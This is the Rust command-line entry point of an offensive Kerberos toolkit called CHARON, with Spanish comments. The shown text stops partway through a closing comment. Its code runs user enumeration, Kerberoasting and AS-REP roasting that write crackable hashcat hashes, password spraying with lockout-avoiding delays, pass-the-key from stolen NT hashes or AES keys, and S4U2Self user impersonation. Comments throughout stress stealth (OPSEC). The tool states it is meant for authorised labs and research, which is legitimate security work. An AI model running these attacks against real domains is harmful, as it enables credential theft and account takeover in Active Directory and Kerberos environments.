//! CHARON — el barquero que transporta mensajes entre cliente y KDC
//! y te muestra todo lo que cruza el río.

use std::io::{BufRead as _, Write as _};
use std::process::ExitCode;

use clap::{Parser, Subcommand, ValueEnum};
use owo_colors::OwoColorize;
use charon_client::KdcConnection;
use charon_kcrypto::{etype as etype_mod, KerberosKey};

/// Workbench del protocolo Kerberos: stack propio desde el wire format,
/// primitivos ofensivos con control total de cada campo y decodificación
/// campo a campo con referencia al RFC.
#[derive(Parser, Debug)]
#[command(
    name = "charon",
    version,
    about = "Workbench de protocolo Kerberos: arma y microscopio",
    long_about = "CHARON implementa el protocolo Kerberos desde el wire format —codec ASN.1/DER propio, crypto RFC-conformante—, ejecuta los primitivos ofensivos estándar con control total sobre cada campo, y decodifica cada mensaje explicándolo con referencia al RFC.\n\nDiseñado para laboratorios propios (pentesting autorizado, análisis defensivo, investigación).",
    after_help = "Ejemplos:\n  charon enum --users jdoe,svcsql,ghost -r LAB.LOCAL\n  charon kerberoast --spn MSSQLSvc/srv01.lab.local --user jdoe --password '***' -r LAB.LOCAL\n  charon decode --file as-rep.bin --password '***' --user jdoe -r LAB.LOCAL\n\nUso ético: solo contra dominios y KDCs de tu propiedad o con autorización explícita."
)]
struct Cli {
    #[command(subcommand)]
    command: Command,
}

#[derive(ValueEnum, Clone, Copy, Debug)]
enum ETypeArg {
    Aes128,
    Aes256,
    Rc4,
}

impl ETypeArg {
    fn id(self) -> i32 {
        match self {
            ETypeArg::Aes128 => etype_mod::AES128_CTS_HMAC_SHA1_96,
            ETypeArg::Aes256 => etype_mod::AES256_CTS_HMAC_SHA1_96,
            ETypeArg::Rc4 => etype_mod::RC4_HMAC,
        }
    }
}

#[derive(Subcommand, Debug)]
enum Command {
    /// Enumera usuarios explotando los códigos de error del KDC (6/25/24).
    Enum {
        /// Usuarios a comprobar, separados por coma o ruta a fichero (@fichero).
        #[arg(short, long, value_delimiter = ',')]
        users: Vec<String>,
        #[arg(short, long)]
        realm: String,
        #[arg(long, default_value = "127.0.0.1")]
        dc: String,
        #[arg(long, default_value_t = 88)]
        port: u16,
        /// Preferencia de etypes en la petición (sin preauth es informativo).
        #[arg(long, value_enum, default_value = "aes256")]
        etype: ETypeArg,
        #[arg(long)]
        json: bool,
    },
    /// Kerberoasting AES-first: pide tickets de servicio para crackear offline.
    Kerberoast {
        /// SPNs objetivo, separados por coma.
        #[arg(short, long, value_delimiter = ',')]
        spn: Vec<String>,
        #[arg(short, long)]
        user: String,
        /// Contraseña del usuario (o --password-stdin; env: CHARON_PASSWORD).
        #[arg(short, long, env = "CHARON_PASSWORD", hide_env_values = true)]
        password: Option<String>,
        /// Lee la contraseña por stdin: no aparece en `ps` ni en el history.
        #[arg(long)]
        password_stdin: bool,
        #[arg(short, long)]
        realm: String,
        /// Salt AES del usuario (si no lo conoces, Charon lo aprende del error 25).
        #[arg(long)]
        salt: Option<String>,
        /// Orden de etypes pedidos al KDC (AES-first por defecto: OPSEC).
        #[arg(long, value_enum, num_args = 1.., default_values = &["aes256", "aes128"])]
        etype: Vec<ETypeArg>,
        #[arg(long, default_value = "127.0.0.1")]
        dc: String,
        #[arg(long, default_value_t = 88)]
        port: u16,
        #[arg(long)]
        json: bool,
        /// Escribe los hashes hashcat a este fichero además de imprimirlos.
        #[arg(long)]
        output: Option<String>,
    },
    /// Password spraying: una contraseña candidata contra muchos usuarios
    /// con el flujo AS completo (clasifica 6/24/éxito y aprende el salt
    /// de cada usuario del error 25 antes de probar).
    Spray {
        /// Usuarios a probar, separados por coma o ruta a fichero (@fichero).
        #[arg(short, long, value_delimiter = ',')]
        users: Vec<String>,
        /// Fichero (ruta o @ruta) con pares usuario:contraseña, uno por
        /// línea ('#' comenta; la contraseña puede contener ':'). Si se
        /// da, cada usuario se prueba con SU contraseña y se ignoran
        /// --users y --password. Página de seguridad: el fichero queda
        /// con contraseñas en claro — 900 permisos recomendados.
        #[arg(long)]
        pairs: Option<String>,
        /// Contraseña candidata (o --password-stdin; env: CHARON_PASSWORD).
        #[arg(short, long, env = "CHARON_PASSWORD", hide_env_values = true)]
        password: Option<String>,
        /// Lee la contraseña por stdin: no aparece en `ps` ni en el history.
        #[arg(long)]
        password_stdin: bool,
        #[arg(short, long)]
        realm: String,
        #[arg(long, default_value = "127.0.0.1")]
        dc: String,
        #[arg(long, default_value_t = 88)]
        port: u16,
        /// Pausa entre intentos en ms (OPSEC: menos ruido y menos lockouts).
        #[arg(long, default_value_t = 0)]
        delay_ms: u64,
        #[arg(long)]
        json: bool,
        /// Fichero donde dejar los aciertos (usuario<TAB>contraseña).
        #[arg(long)]
        output: Option<String>,
    },
    /// AS-REP roasting: cuentas con DONT_REQUIRE_PREAUTH.
    Asreproast {
        #[arg(short, long, value_delimiter = ',')]
        users: Vec<String>,
        #[arg(short, long)]
        realm: String,
        #[arg(long, default_value = "127.0.0.1")]
        dc: String,
        #[arg(long, default_value_t = 88)]
        port: u16,
        #[arg(long)]
        json: bool,
        /// Escribe los hashes hashcat a este fichero además de imprimirlos.
        #[arg(long)]
        output: Option<String>,
    },
    /// Pass-the-key: autentica con NT hash o clave AES sin la contraseña.
    Passthekey {
        #[arg(short, long)]
        user: String,
        #[arg(short, long)]
        realm: String,
        /// NT hash (32 hex) — implica etype 23.
        #[arg(long, group = "key")]
        nt_hash: Option<String>,
        /// Clave AES128/AES256 en hex — el etype se deduce de la longitud.
        #[arg(long, group = "key")]
        aes_key: Option<String>,
        #[arg(long, default_value = "127.0.0.1")]
        dc: String,
        #[arg(long, default_value_t = 88)]
        port: u16,
        /// Tras autenticar, muestra el trace completo del intercambio.
        #[arg(long)]
        trace: bool,
    },
    /// Obtiene un TGT y muestra qué viajó por el cable.
    As {
        #[arg(short, long)]
        user: String,
        /// Contraseña (o --password-stdin; env: CHARON_PASSWORD).
        #[arg(short, long, env = "CHARON_PASSWORD", hide_env_values = true)]
        password: Option<String>,
        /// Lee la contraseña por stdin: no aparece en `ps` ni en el history.
        #[arg(long)]
        password_stdin: bool,
        #[arg(short, long)]
        realm: String,
        /// Salt AES (por defecto: realm + cname, la construcción estándar).
        #[arg(long)]
        salt: Option<String>,
        #[arg(long, value_enum, default_value = "aes256")]
        etype: ETypeArg,
        /// Pide un TGT RENOVABLE (flag RENEWABLE + rtime de 7 días, que
        /// el KDC recorta a su max_renewable_life): lo que `kinit -r`.
        #[arg(long)]
        renewable: bool,
        #[arg(long, default_value = "127.0.0.1")]
        dc: String,
        #[arg(long, default_value_t = 88)]
        port: u16,
    },
    /// Renovación de TGT (RFC 4120 §3.3.3): pide un TGT renovable y lo
    /// renueva por el cable (TGS-REQ con flag RENEW y el TGT como
    /// ticket de cabecera). La renovación conserva la authtime y
    /// extiende el endtime dentro del renew-till concedido.
    Renew {
        #[arg(short, long)]
        user: String,
        /// Contraseña (o --password-stdin; env: CHARON_PASSWORD).
        #[arg(short, long, env = "CHARON_PASSWORD", hide_env_values = true)]
        password: Option<String>,
        /// Lee la contraseña por stdin: no aparece en `ps` ni en el history.
        #[arg(long)]
        password_stdin: bool,
        #[arg(short, long)]
        realm: String,
        /// Salt AES (por defecto lo aprende del error 25).
        #[arg(long)]
        salt: Option<String>,
        /// Ventana de renovación pedida, en horas (el KDC recorta a su
        /// max_renewable_life; el lab: 7 días = 168 h).
        #[arg(long, default_value_t = 168)]
        renew_hours: u64,
        #[arg(long, default_value = "127.0.0.1")]
        dc: String,
        #[arg(long, default_value_t = 88)]
        port: u16,
        /// Muestra el trace del TGS-REP de la renovación.
        #[arg(long)]
        trace: bool,
    },
    /// Decodifica cualquier mensaje Kerberos capturado y lo explica campo a campo.
    Decode {
        /// Fichero con el mensaje DER crudo (sin framing TCP).
        #[arg(short, long)]
        file: String,
        /// Clave para descifrar el enc-part (contraseña: salt = realm+user).
        #[arg(short, long, env = "CHARON_PASSWORD", hide_env_values = true)]
        password: Option<String>,
        /// Lee la contraseña por stdin: no aparece en `ps` ni en el history.
        #[arg(long)]
        password_stdin: bool,
        /// Alternativa: NT hash para etype 23.
        #[arg(long)]
        nt_hash: Option<String>,
        #[arg(short, long)]
        realm: String,
        #[arg(short, long)]
        user: String,
        /// Cifra el enc-part de un AS-REP (usage 3) o TGS-REP (usage 8) según el mensaje.
        #[arg(long, default_value_t = 8)]
        usage: u32,
        #[arg(long)]
        json: bool,
    },
    /// S4U2Self (MS-SFU): ticket para un usuario "en nombre de" otro,
    /// presentando el TGT del servicio. Útil para ver el PAC delegado.
    S4u2self {
        /// El servicio que pide (dueño del TGT).
        #[arg(short, long)]
        user: String,
        #[arg(short, long, env = "CHARON_PASSWORD", hide_env_values = true)]
        password: String,
        /// Salt AES del servicio.
        #[arg(long)]
        salt: Option<String>,
        /// Usuario a suplantar.
        #[arg(short, long)]
        impersonate: String,
        #[arg(short, long)]
        realm: String,
        #[arg(long, default_value = "127.0.0.1")]
        dc: String,
        #[arg(long, default_value_t = 88)]
        port: u16,
    },
    /// Ejecuta la matriz de comportamiento KDC y escribe el dataset JSON.
    Matrix {
        #[arg(short, long)]
        realm: String,
        /// Usuario válido con contraseña conocida.
        #[arg(short, long)]
        user: String,
        #[arg(short, long, env = "CHARON_PASSWORD", hide_env_values = true)]
        password: String,
        /// Cuenta AES-only del laboratorio.
        #[arg(long, default_value = "aesuser")]
        aes_only_user: String,
        /// Cuenta DONT_REQUIRE_PREAUTH del laboratorio.
        #[arg(long, default_value = "nopreauth")]
        no_preauth_user: String,
        /// SPN de servicio con AES.
        #[arg(long, default_value = "mssql/srv01.lab.local")]
        spn_with_aes: String,
        /// SPN de servicio RC4-only.
        #[arg(long, default_value = "legacy")]
        spn_rc4_only: String,
        /// Usuario que NO debe existir (sonda de enumeración).
        #[arg(long, default_value = "ghost-inexistente-charon")]
        ghost_user: String,
        /// Etiqueta del perfil en el dataset (ej: mit-krb5-1.21, windows-dc, samba).
        #[arg(long, default_value = "custom")]
        profile: String,
        #[arg(long, default_value = "127.0.0.1")]
        dc: String,
        #[arg(long, default_value_t = 88)]
        port: u16,
        /// Fichero de salida (por defecto: stdout).
        #[arg(short, long)]
        out: Option<String>,
    },
}

fn conn(dc: &str, port: u16) -> KdcConnection {
    KdcConnection::new(dc, port)
}

fn main() -> ExitCode {
    let cli = Cli::parse();
    match run(cli) {
        Ok(()) => ExitCode::SUCCESS,
        Err(msg) => {
            eprintln!("{} {}", "error:".red().bold(), msg);
            ExitCode::FAILURE
        }
    }
}

fn fail(msg: String) -> Result<(), String> {
    Err(msg)
}

fn run(cli: Cli) -> Result<(), String> {
    match cli.command {
        Command::Enum { users, realm, dc, port, etype, json } => {
            let list = resolve_users(&users)?;
            if list.is_empty() {
                return fail("--users vacío: pasa usuarios separados por coma o @fichero".into());
            }
            let c = conn(&dc, port);
            let etypes = [etype.id()];
            let mut results = Vec::new();
            for u in &list {
                let status = charon_attacks::enum_user(&c, u, &realm, &etypes).map_err(|e| e.to_string())?;
                if !json {
                    print_enum(u, &status);
                }
                results.push((u.clone(), status));
            }
            if json {
                let json_items: Vec<serde_json::Value> = results
                    .iter()
                    .map(|(u, st)| serde_json::json!({"user": u, "status": format!("{st:?}")}))
                    .collect();
                println!("{}", serde_json::to_string_pretty(&json_items).map_err(|e| e.to_string())?);
            } else {
                let exists = results.iter().filter(|(_, s)| s.exists()).count();
                println!(
                    "\n{} {} de {} usuarios existen según {}",
                    "resumen:".bold(),
                    exists.to_string().cyan(),
                    results.len(),
                    dc.bold()
                );
            }
            Ok(())
        }

        Command::Kerberoast { spn, user, password, password_stdin, realm, salt, etype, dc, port, json, output } => {
            if spn.is_empty() {
                return fail("--spn vacío".into());
            }
            let password = resolve_password(password, password_stdin)?;
            let c = conn(&dc, port);
            // 1) aprender el salt si no viene: AS-REQ sin preauth del usuario.
            let salt = match salt {
                Some(s) => s,
                None => learn_salt(&c, &user, &realm)?,
            };
            // 2) TGT con AES (clave del usuario derivada del salt).
            let key = key_from_credentials(&user, &realm, &salt, &password, None, None)?;
            let tgt = charon_client::request_tgt(&c, &user, &realm, &key, &[etype_mod::AES256_CTS_HMAC_SHA1_96], charon_krb5::kdc_options::FORWARDABLE)
                .map_err(|e| format!("no se pudo obtener el TGT (¿contraseña/salt correctos?): {e}"))?;
            // 3) AES-first: pedir 18/17 primero (OPSEC: sin downgrade).
            let etypes: Vec<i32> = {
                let mut v: Vec<i32> = etype.iter().map(|e| e.id()).collect();
                v.push(etype_mod::RC4_HMAC); // último recurso
                v.dedup();
                v
            };
            let mut out = Vec::new();
            let mut hashes = Vec::new();
            for s in &spn {
                let r = charon_attacks::kerberoast(&c, &tgt, s, &etypes, charon_krb5::kdc_options::CANONICALIZE)
                    .map_err(|e| e.to_string())?;
                hashes.push(r.hashcat.clone());
                if json {
                    out.push(serde_json::json!({
                        "spn": r.spn, "account": r.account, "realm": r.realm,
                        "etype": r.etype, "hashcat": r.hashcat
                    }));
                } else {
                    println!(
                        "\n{} {} → ticket en {}",
                        "kerberoast:".bold(),
                        s.cyan(),
                        etype_name(r.etype).yellow()
                    );
                    println!("{}", r.hashcat.green());
                }
            }
            if json {
                println!("{}", serde_json::to_string_pretty(&out).map_err(|e| e.to_string())?);
            }
            if let Some(path) = &output {
                write_output(path, &hashes)?;
            }
            Ok(())
        }

        Command::Asreproast { users, realm, dc, port, json, output } => {
            let list = resolve_users(&users)?;
            let c = conn(&dc, port);
            let etypes = [etype_mod::AES256_CTS_HMAC_SHA1_96, etype_mod::AES128_CTS_HMAC_SHA1_96, etype_mod::RC4_HMAC];
            let mut any = false;
            let mut hashes = Vec::new();
            for u in &list {
                let r = charon_attacks::asreproast(&c, u, &realm, &etypes).map_err(|e| e.to_string())?;
                match r {
                    Some(rep) => {
                        any = true;
                        hashes.push(rep.hashcat.clone());
                        if !json {
                            println!(
                                "\n{} {} → cuenta sin preauth, ticket en {}",
                                "asreproast:".bold(),
                                u.cyan(),
                                etype_name(rep.etype).yellow()
                            );
                            println!("{}", rep.hashcat.green());
                        } else {
                            println!("{}", serde_json::json!({"account": rep.account, "etype": rep.etype, "hashcat": rep.hashcat}));
                        }
                    }
                    None => {
                        if !json {
                            println!("{} {}: la cuenta requiere preauth o no existe", "·".dimmed(), u);
                        }
                    }
                }
            }
            if json && !any {
                println!("[]");
            }
            let _ = any;
            if let Some(path) = &output {
                write_output(path, &hashes)?;
            }
            Ok(())
        }

        Command::Spray { users, pairs, password, password_stdin, realm, dc, port, delay_ms, json, output } => {
            // En modo pares cada usuario lleva SU contraseña; el modo
            // clásico (una contraseña contra la lista) queda intacto.
            let targets: Vec<(String, String)> = if let Some(path) = &pairs {
                if !users.is_empty() || password.is_some() || password_stdin {
                    return fail(
                        "--pairs no es compatible con --users/--password/--password-stdin: en modo pares cada usuario lleva su propia contraseña".into(),
                    );
                }
                resolve_pairs(path)?
            } else {
                let list = resolve_users(&users)?;
                if list.is_empty() {
                    return fail("--users vacío: pasa usuarios separados por coma o @fichero".into());
                }
                let password = resolve_password(password, password_stdin)?;
                list.into_iter().map(|u| (u, password.clone())).collect()
            };
            if targets.is_empty() {
                return fail("no hay objetivos de spray".into());
            }
            let c = conn(&dc, port);
            let etypes = [etype_mod::AES256_CTS_HMAC_SHA1_96, etype_mod::AES128_CTS_HMAC_SHA1_96];
            let mut hits = Vec::new();
            let mut rows = Vec::new();
            for (i, (u, pw)) in targets.iter().enumerate() {
                if i > 0 && delay_ms > 0 {
                    std::thread::sleep(std::time::Duration::from_millis(delay_ms));
                }
                match charon_attacks::spray_password(&c, u, &realm, pw, &etypes) {
                    Ok(att) => {
                        if att.result.valid() {
                            hits.push(format!("{u}\t{pw}"));
                        }
                        if !json {
                            print_spray(&att);
                        }
                        rows.push(serde_json::json!({
                            "user": att.user,
                            "result": format!("{:?}", att.result),
                        }));
                    }
                    Err(e) => {
                        if !json {
                            println!("{} {}: fallo de protocolo: {e}", "✗".red().bold(), u.cyan());
                        }
                        rows.push(serde_json::json!({"user": u, "error": e}));
                    }
                }
            }
            if json {
                println!("{}", serde_json::to_string_pretty(&rows).map_err(|e| e.to_string())?);
            } else {
                println!(
                    "\n{} {} credenciales válidas de {} usuarios probados contra {}",
                    "resumen:".bold(),
                    hits.len().to_string().cyan(),
                    targets.len(),
                    dc.bold()
                );
            }
            if let Some(path) = &output {
                write_output(path, &hits)?;
            }
            Ok(())
        }

        Command::Passthekey { user, realm, nt_hash, aes_key, dc, port, trace } => {
            let c = conn(&dc, port);
            let (key, salt_used) = if let Some(h) = &nt_hash {
                let bytes = decode_hex(h)?;
                (KerberosKey::from_raw(etype_mod::RC4_HMAC, &bytes).map_err(|e| e.to_string())?, "NT hash (etype 23)".to_string())
            } else if let Some(h) = &aes_key {
                let bytes = decode_hex(h)?;
                let et = match bytes.len() {
                    16 => etype_mod::AES128_CTS_HMAC_SHA1_96,
                    32 => etype_mod::AES256_CTS_HMAC_SHA1_96,
                    n => return Err(format!("clave AES de {n} bytes: deben ser 16 o 32")),
                };
                // La clave AES necesita salt para… nada: ya ES la clave.
                (KerberosKey::from_raw(et, &bytes).map_err(|e| e.to_string())?, format!("clave AES ({})", etype_name(et)))
            } else {
                return Err("indica --nt-hash o --aes-key".into());
            };
            let _ = salt_used;
            // Con clave RC4 pedimos también 18: MIT 1.21 exige un etype de
            // sesión no deprecado aunque el preauth verifique con RC4.
            let etypes: Vec<i32> = if key.etype() == etype_mod::RC4_HMAC {
                vec![etype_mod::RC4_HMAC, etype_mod::AES256_CTS_HMAC_SHA1_96]
            } else {
                vec![key.etype()]
            };
            let tgt = charon_client::request_tgt(&c, &user, &realm, &key, &etypes, 0)
                .map_err(|e| format!("pass-the-key rechazado por el KDC: {e}"))?;
            println!(
                "{} TGT obtenido para {} usando la clave directamente ({}).",
                "pass-the-key:".bold(),
                user.cyan(),
                etype_name(key.etype())
            );
            println!("  sesión: etype {}, caduca {}", tgt.session_key.keytype, tgt.endtime);
            if trace {
                let node = charon_trace::trace_kdc_rep(&tgt.raw_reply, Some(&key)).map_err(|e| e.to_string())?;
                println!("\n{}", charon_trace::render_text(&node));
            }
            Ok(())
        }

        Command::As { user, password, password_stdin, realm, salt, etype, renewable, dc, port } => {
            let c = conn(&dc, port);
            let password = resolve_password(password, password_stdin)?;
            let salt = match salt {
                Some(s) => s,
                None => learn_salt(&c, &user, &realm)?,
            };
            let key = key_from_credentials(&user, &realm, &salt, &password, None, None)?;
            let tgt = if renewable {
                let till = charon_asn1::KrbTime::now().plus_secs(7 * 86_400);
                charon_client::request_tgt_renewable(&c, &user, &realm, &key, &[etype.id()], till)
                    .map_err(|e| e.to_string())?
            } else {
                charon_client::request_tgt(&c, &user, &realm, &key, &[etype.id()], 0)
                    .map_err(|e| e.to_string())?
            };
            let renew_note = if renewable {
                format!(", renovable hasta {}", tgt.renew_till.map(|t| t.to_string()).unwrap_or_default())
            } else {
                String::new()
            };
            println!(
                "{} TGT {} → {}, sesión etype {}, caduca {}{}",
                "AS:".bold(),
                format!("{user}@{realm}").cyan(),
                tgt.ticket.sname.flat().yellow(),
                tgt.session_key.keytype,
                tgt.endtime,
                renew_note
            );
            let node = charon_trace::trace_kdc_rep(&tgt.raw_reply, Some(&key)).map_err(|e| e.to_string())?;
            println!("\n{}", charon_trace::render_text(&node));
            Ok(())
        }

        Command::Renew { user, password, password_stdin, realm, salt, renew_hours, dc, port, trace } => {
            let c = conn(&dc, port);
            let password = resolve_password(password, password_stdin)?;
            let salt = match salt {
                Some(s) => s,
                None => learn_salt(&c, &user, &realm)?,
            };
            let key = key_from_credentials(&user, &realm, &salt, &password, None, None)?;
            // Acotado antes del cast a i64: saturating_mul en u64 aún puede
            // producir u64::MAX y "as i64" lo volvería negativo (till en el
            // pasado, el KDC lo rechazaría con un mensaje incomprensible).
            let till = charon_asn1::KrbTime::now()
                .plus_secs(renew_hours.saturating_mul(3_600).min(i64::MAX as u64) as i64);
            let tgt = charon_client::request_tgt_renewable(&c, &user, &realm, &key, &[etype_mod::AES256_CTS_HMAC_SHA1_96], till)
                .map_err(|e| format!("no se pudo obtener el TGT renovable: {e}"))?;
            if tgt.flags & charon_krb5::ticket_flags::RENEWABLE == 0 {
                return fail(
                    "el KDC no concedió el flag RENEWABLE (revisa max_renewable_life del KDC)".into(),
                );
            }
            println!(
                "{} TGT renovable {} → caduca {}, renovable hasta {}",
                "renew:".bold(),
                format!("{user}@{realm}").cyan(),
                tgt.endtime.to_string().yellow(),
                tgt.renew_till.map(|t| t.to_string()).unwrap_or_default()
            );
            let renewed = charon_client::renew_tgt(&c, &tgt, till)
                .map_err(|e| format!("renovación rechazada por el KDC: {e}"))?;
            println!(
                "{} renovado → caduca {} (authtime conservada: {}, nueva clave de sesión etype {})",
                "  ↳".green(),
                renewed.endtime.to_string().yellow(),
                renewed.authtime,
                renewed.session_key.keytype
            );
            if trace {
                // El enc-part del TGS-REP va con la clave de sesión del TGT
                // ORIGINAL (usage 8): eso es lo que el trace necesita.
                let sess = KerberosKey::from_raw(tgt.session_key.keytype, &tgt.session_key.keyvalue)
                    .map_err(|e| e.to_string())?;
                let node = charon_trace::trace_kdc_rep(&renewed.raw_reply, Some(&sess)).map_err(|e| e.to_string())?;
                println!("\n{}", charon_trace::render_text(&node));
            }
            Ok(())
        }

        Command::Decode { file, password, password_stdin, nt_hash, realm, user, usage, json } => {
            let bytes = std::fs::read(&file).map_err(|e| format!("no pude leer {file}: {e}"))?;
            let password = if password_stdin { Some(resolve_password(password, true)?) } else { password };
            let key = if let Some(h) = &nt_hash {
                let b = decode_hex(h)?;
                Some(KerberosKey::from_raw(etype_mod::RC4_HMAC, &b).map_err(|e| e.to_string())?)
            } else {
                match (&password, &user) {
                    (Some(p), u) => {
                        let salt = format!("{realm}{}", u.as_str());
                        Some(
                            KerberosKey::from_password(p, &salt, etype_mod::AES256_CTS_HMAC_SHA1_96)
                                .map_err(|e| e.to_string())?,
                        )
                    }
                    _ => None,
                }
            };
            let mut node = charon_trace::trace_message(&bytes).map_err(|e| e.to_string())?;
            // Si hay clave y el mensaje es AS-REP/TGS-REP, descifra el enc-part.
            if key.is_some() && (node.name == "AS-REP" || node.name == "TGS-REP") {
                node = charon_trace::trace_kdc_rep(&bytes, key.as_ref()).map_err(|e| e.to_string())?;
            }
            let _ = usage;
            if json {
                println!("{}", serde_json::to_string_pretty(&node).map_err(|e| e.to_string())?);
            } else {
                println!("{}", charon_trace::render_text(&node));
            }
            Ok(())
        }

        Command::S4u2self { user, password, salt, impersonate, realm, dc, port } => {
            let c = conn(&dc, port);
            let salt = match salt {
                Some(s) => s,
                None => learn_salt(&c, &user, &realm)?,
            };
            let key = key_from_credentials(&user, &realm, &salt, &password, None, None)?;
            let tgt = charon_client::request_tgt(&c, &user, &realm, &key, &[etype_mod::AES256_CTS_HMAC_SHA1_96], 0)
                .map_err(|e| format!("no se pudo obtener el TGT: {e}"))?;
            let st = charon_client::s4u2self(&c, &tgt, &user, &impersonate, &realm)
                .map_err(|e| format!("S4U2Self rechazado: {e}"))?;
            println!(
                "{} ticket para {} en nombre de {} (etype {})",
                "s4u2self:".bold(),
                st.ticket.sname.flat().cyan(),
                impersonate.yellow(),
                st.ticket.enc_part.etype
            );
            // El ticket va cifrado con la clave larga del servicio: al
            // descifrarlo, el PAC muestra la identidad suplantada.
            // El KDC ELIGE el etype del ticket: con cuentas que tienen RC4
            // puede emitirlo en 23 aunque el analista haya derivado AES256
            // (lección del lab: jdoe con arcfour restaurado → ticket S4U en
            // RC4). La clave de descifrado se elige según el etype REAL del
            // ticket, como hacen impacket/Rubeus.
            let pac_key = if st.ticket.enc_part.etype == etype_mod::RC4_HMAC
                && key.etype() != etype_mod::RC4_HMAC
            {
                KerberosKey::from_password(&password, &salt, etype_mod::RC4_HMAC)
                    .map_err(|e| format!("no pude derivar la clave RC4 del servicio: {e}"))?
            } else {
                key
            };
            match charon_krb5::pac::extract_pac(&st.ticket, &pac_key) {
                Ok(pac) => match pac.client_info() {
                    Some((_, name)) => println!("  PAC CLIENT INFO: {}", name.green()),
                    None => println!("  PAC buffers: {:?}", pac.buffers.iter().map(|b| b.buffer_type).collect::<Vec<_>>()),
                },
                Err(e) => println!("  PAC: {e}"),
            }
            Ok(())
        }

        Command::Matrix { realm, user, password, aes_only_user, no_preauth_user, spn_with_aes, spn_rc4_only, ghost_user, profile, dc, port, out } => {
            let c = conn(&dc, port);
            // El salt se aprende del propio KDC (el flujo canónico del proyecto).
            let salt = learn_salt(&c, &user, &realm)?;
            let user_key = key_from_credentials(&user, &realm, &salt, &password, None, None)?;
            let ctx = charon_matrix::ProbeCtx {
                conn: c,
                realm: realm.clone(),
                user: user.clone(),
                user_key,
                aes_only_user,
                no_preauth_user,
                spn_with_aes,
                spn_rc4_only,
                ghost_user,
            };
            let dataset = charon_matrix::run_battery(&ctx, &profile);
            let text = serde_json::to_string_pretty(&dataset).map_err(|e| e.to_string())?;
            match out {
                Some(path) => {
                    std::fs::write(&path, &text).map_err(|e| format!("no pude escribir {path}: {e}"))?;
                    println!("{} dataset escrito en {}", "matrix:".bold(), path.cyan());
                    println!("  {} sondas contra {}", dataset.rows.len(), format!("{dc}:{port}").bold());
                }
                None => println!("{text}"),
            }
            Ok(())
        }
    }
}

// ---------- helpers de CLI ----------

fn print_enum(user: &str, status: &charon_attacks::UserStatus) {
    use charon_attacks::UserStatus::*;
    match status {
        ExistsWithPreauth { salts } => {
            println!("{} {} existe (requiere preauth)", "✓".green().bold(), user.cyan());
            for (et, salt) in salts {
                println!("    salt (etype {et}): {}", salt.yellow());
            }
        }
        ExistsWithoutPreauth => {
            println!("{} {} existe y NO requiere preauth → AS-REP roasteable", "!".yellow().bold(), user.cyan());
        }
        Unknown => {
            println!("{} {} no existe", "✗".red().bold(), user.dimmed());
        }
        PreauthFailed => println!("{} {} existe (preauth fallido)", "✓".green().bold(), user.cyan()),
        Other(code) => println!("{} {} → código {} inesperado (apúntalo: fingerprint del KDC)", "?".yellow(), user, code),
    }
}

/// "@fichero" carga una lista; si no, toma los valores tal cual.
fn resolve_users(input: &[String]) -> Result<Vec<String>, String> {
    let mut out = Vec::new();
    for item in input {
        if let Some(path) = item.strip_prefix('@') {
            let content = std::fs::read_to_string(path).map_err(|e| format!("no pude leer {path}: {e}"))?;
            for line in content.lines() {
                let u = line.trim();
                if !u.is_empty() && !u.starts_with('#') {
                    out.push(u.to_string());
                }
            }
        } else {
            out.push(item.clone());
        }
    }
    Ok(out)
}

/// Carga un fichero de pares `usuario:contraseña` (uno por línea) para
/// el spray por pares. Se acepta ruta directa o "@ruta" (misma forma
/// que --users). Reglas: '#' comenta la línea; la contraseña puede
/// contener ':' (se parte en el primero); los espacios de los extremos
/// de la línea y de la contraseña se recortan — es formato de
/// laboratorio: para contraseñas con espacios significativos, usa el
/// modo clásico con --password-stdin. Los errores señalan el número de
/// línea (falla pronto, no a mitad de spray).
fn resolve_pairs(spec: &str) -> Result<Vec<(String, String)>, String> {
    let path = spec.strip_prefix('@').unwrap_or(spec);
    let content = std::fs::read_to_string(path).map_err(|e| format!("no pude leer {path}: {e}"))?;
    let mut out = Vec::new();
    for (n, line) in content.lines().enumerate() {
        let line = line.trim();
        if line.is_empty() || line.starts_with('#') {
            continue;
        }
        let Some((u, pw)) = line.split_once(':') else {
            return Err(format!("línea {}: falta ':' — formato usuario:contraseña", n + 1));
        };
        let u = u.trim();
        let pw = pw.trim();
        if u.is_empty() {
            return Err(format!("línea {}: usuario vacío", n + 1));
        }
        if pw.is_empty() {
            return Err(format!("línea {}: contraseña vacía (¿línea incompleta?)", n + 1));
        }
        out.push((u.to_string(), pw.to_string()));
    }
    Ok(out)
}

/// Contraseña desde argv/env o desde stdin (`--password-stdin`): la vía
/// stdin evita que el secreto quede visible en `ps` y en el history del
/// shell. argv se mantiene por comodidad en el lab.
fn resolve_password(password: Option<String>, stdin: bool) -> Result<String, String> {
    if stdin {
        let mut buf = String::new();
        std::io::stdin()
            .lock()
            .read_line(&mut buf)
            .map_err(|e| format!("no pude leer la contraseña de stdin: {e}"))?;
        let pw = buf.trim_end_matches(['\r', '\n']).to_string();
        if pw.is_empty() {
            return Err("stdin cerrado o contraseña vacía".into());
        }
        return Ok(pw);
    }
    password.ok_or_else(|| {
        "falta la contraseña: usa -p/--password, la env CHARON_PASSWORD o --password-stdin".into()
    })
}

/// Vuelca líneas (hashes hashcat, aciertos de spray) a un fichero.
fn write_output(path: &str, lines: &[String]) -> Result<(), String> {
    std::fs::write(path, lines.join("\n") + if lines.is_empty() { "" } else { "\n" })
        .map_err(|e| format!("no pude escribir {path}: {e}"))?;
    eprintln!(
        "{} {} líneas escritas en {}",
        "escrito:".dimmed(),
        lines.len(),
        path.cyan()
    );
    Ok(())
}

/// Imprime el resultado de un intento de spray con el mismo lenguaje
/// visual que enum/kerberoast.
fn print_spray(a: &charon_attacks::SprayAttempt) {
    use charon_attacks::SprayResult as SR;
    match &a.result {
        SR::Valid => {
            println!("{} {} — CONTRASEÑA VÁLIDA (TGT obtenido)", "✓".green().bold(), a.user.cyan())
        }
        SR::WrongPassword => {
            println!("{} {} — incorrecta (el usuario existe, preauth fallido)", "✗".red().bold(), a.user.cyan())
        }
        SR::UnknownUser => println!("{} {} — inexistente", "✗".dimmed(), a.user.cyan()),
        SR::NoPreauth => println!(
            "{} {} — sin preauth: la contraseña no interviene (AS-REP roasteable)",
            "!".yellow().bold(),
            a.user.cyan()
        ),
        SR::KdcError { code, detail } => {
            println!("{} {} — error KDC {code} {detail}", "!".yellow().bold(), a.user.cyan())
        }
    }
}

/// Aprende el salt del usuario con un AS-REQ sin preauth: el error 25 del
/// KDC regala el PA-ETYPE-INFO2. El protocolo le dice a Charon cómo
/// construir la clave del usuario.
